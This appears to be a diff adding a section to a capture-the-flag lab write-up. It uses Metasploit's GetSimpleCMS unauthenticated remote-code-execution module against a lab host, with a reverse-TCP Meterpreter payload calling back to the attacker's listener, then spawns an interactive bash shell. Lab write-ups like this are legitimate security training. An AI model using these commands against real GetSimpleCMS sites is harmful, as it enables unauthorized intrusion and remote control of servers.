@@ -228,3 +228,155 @@ $ cat ~/root.txt
 
 f1fba6e9f71efb2630e6e34da6387842
 ```
+
+---
+
+another approach is using metasploit
+
+```
+$ msfconsole
+
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > search getsimple
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
+   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
+```
+
+we use #1:
+
+```
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > use 1
+
+[*] Using configured payload php/meterpreter/reverse_tcp
+```
+
+`show info` gives us more details about the exploit.
+
+```
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show info
+
+       Name: GetSimpleCMS Unauthenticated RCE
+     Module: exploit/multi/http/getsimplecms_unauth_code_exec
+   Platform: PHP
+       Arch: php
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2019-04-28
+
+Provided by:
+  truerand0m
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   GetSimpleCMS 3.3.15 and before
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting        Required  Description
+  ----       ---------------        --------  -----------
+  Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+  RHOSTS     http://10.129.207.104  yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
+                                              ploit/basics/using-metasploit.html
+  RPORT      80                     yes       The target port (TCP)
+  SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                      yes       The base path to the cms
+  VHOST      gettingstarted.htb     no        HTTP server virtual host
+
+Payload information:
+  Avoid: 1 characters
+
+Description:
+  This module exploits a vulnerability found in GetSimpleCMS,
+  which allows unauthenticated attackers to perform Remote Code Execution.
+  An arbitrary file upload (PHPcode for example) vulnerability can be triggered by an authenticated user,
+  however authentication can be bypassed by leaking the cms API key to target the session manager.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2019-11231
+  https://ssd-disclosure.com/archives/3899/ssd-advisory-getcms-unauthenticated-remote-code-execution
+
+
+View the full module info with the info -d command.
+
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) >
+
+```
+
+then configure options with `set <option>` like so:
+
+```
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options
+
+Module options (exploit/multi/http/getsimplecms_unauth_code_exec):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     http://10.129.207.104  yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
+                                               sploit/basics/using-metasploit.html
+   RPORT      80                     yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                      yes       The base path to the cms
+   VHOST      gettingstarted.htb     no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.24      yes       The listen address (an interface may be specified)
+   LPORT  1337             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   GetSimpleCMS 3.3.15 and before
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+let's run the exploit:
+
+```
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.24:1337
+[*] GetSimpleCMS version 3315
+[*] Sending stage (39927 bytes) to 10.129.207.104
+[*] Meterpreter session 1 opened (10.10.14.24:1337 -> 10.129.207.104:34342) at 2023-12-24 09:53:57 +0100
+```
+
+in meterpreter, we can access the shell with `shell`, then upgrade with `python3`
+
+```
+meterpreter > shell
+Process 2579 created.
+Channel 0 created.
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@gettingstarted:/var/www/html/theme$ ls -lh
+ls -lh
+total 28K
+drwxr-xr-x 3 www-data www-data 4.0K Sep  7  2018 Cardinal
+-rw-r--r-- 1 www-data www-data 1.1K Dec 24 08:45 DqWIpUhGyxR.php
+-rw-r--r-- 1 www-data www-data 1.1K Dec 24 08:42 GUEVHBArPIPythP.php
+drwxr-xr-x 4 www-data www-data 4.0K Sep  7  2018 Innovation
+-rw-r--r-- 1 www-data www-data 1.1K Dec 24 08:24 PAvRRdaMRNFSXu.php
+-rw-r--r-- 1 www-data www-data 1.1K Dec 24 08:37 WVwtxCQjkYvDdTMY.php
+-rw-r--r-- 1 www-data www-data 1.1K Dec 24 08:53 mkoQbIPRiGnQ.php
+www-data@gettingstarted:/var/www/html/theme$
+```
+
+from here, we can use the same vector as before.
